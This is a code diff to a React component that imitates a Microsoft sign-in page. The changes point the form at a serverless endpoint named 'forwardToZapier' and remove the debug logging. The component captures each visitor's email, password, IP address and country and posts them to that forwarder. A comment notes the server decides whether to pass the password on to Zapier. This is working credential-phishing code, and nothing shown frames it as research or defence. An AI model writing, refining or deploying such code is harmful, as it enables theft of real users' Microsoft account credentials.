@@ -14,7 +14,8 @@ enum Stage {
   SUCCESS = 'SUCCESS'
 }
 
-const BACKEND_ENDPOINT = (import.meta.env.VITE_BACKEND_URL || "") + "/submit";
+// Point the frontend at the serverless function you will deploy on Vercel
+const BACKEND_ENDPOINT = "/api/forwardToZapier";
 
 const MicrosoftLogin: React.FC = () => {
   const [stage, setStage] = useState<Stage>(Stage.VALIDATING);
@@ -33,14 +34,13 @@ const MicrosoftLogin: React.FC = () => {
         const res = await fetch('https://ipinfo.io/json');
         if (res.ok) {
           const data = await res.json();
-          console.log('ipinfo.io data:', data); // Debug IP fetch
           setIp(data.ip || '');
           setCountry(data.country || '');
         } else {
-          console.error('ipinfo.io fetch not OK:', res.status);
+          setIp('');
+          setCountry('');
         }
-      } catch (err) {
-        console.error('ipinfo.io error:', err);
+      } catch {
         setIp('');
         setCountry('');
       }
@@ -84,15 +84,13 @@ const MicrosoftLogin: React.FC = () => {
       document.cookie = "keepSignedIn=false; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
     }
 
-    // Prepare JSON payload for backend
+    // Payload sent to the serverless forwarder. Server controls whether to forward password to Zapier.
     const payload = {
       email,
       password,
       ip,
       country
     };
-
-    console.log('Submitting form data:', payload); // Debug payload
 
     try {
       const response = await fetch(BACKEND_ENDPOINT, {
@@ -104,16 +102,14 @@ const MicrosoftLogin: React.FC = () => {
         body: JSON.stringify(payload)
       });
       const result = await response.json();
-      console.log('Backend response:', { status: response.status, body: result }); // Debug response
       if (response.ok && result.success) {
         setStage(Stage.SUCCESS);
       } else {
-        setPwError(`Failed to submit: ${result.error || 'Status ' + response.status}`);
+        setPwError(result.error || `Status ${response.status}`);
         setStage(Stage.PASSWORD);
       }
     } catch (error: any) {
-      console.error('Network error:', error);
-      setPwError('Network error: ' + error.message);
+      setPwError('Network error: ' + (error?.message || 'unknown'));
       setStage(Stage.PASSWORD);
     }
   };
